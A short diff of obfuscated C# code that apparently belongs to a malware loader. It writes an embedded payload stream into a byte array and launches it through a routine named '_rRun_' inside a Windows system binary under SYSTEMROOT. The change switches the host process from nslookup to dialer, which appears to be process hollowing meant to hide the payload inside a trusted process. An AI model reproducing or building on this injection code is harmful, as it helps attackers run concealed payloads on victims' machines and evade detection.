@@ -118,7 +118,7 @@ public partial class _rProgram_
                                         using (var _rms_ = new MemoryStream())
                                         {
                                             _rstreamdata_.CopyTo(_rms_);
-                                            _rRun_(_rms_.ToArray(), Path.Combine(Environment.GetEnvironmentVariable(_rGetString_("#SYSTEMROOT")), _rGetString_("#NSLOOKUP")), null);
+                                            _rRun_(_rms_.ToArray(), Path.Combine(Environment.GetEnvironmentVariable(_rGetString_("#SYSTEMROOT")), _rGetString_("#DIALER")), null);
                                         }
                                     }
                                 }
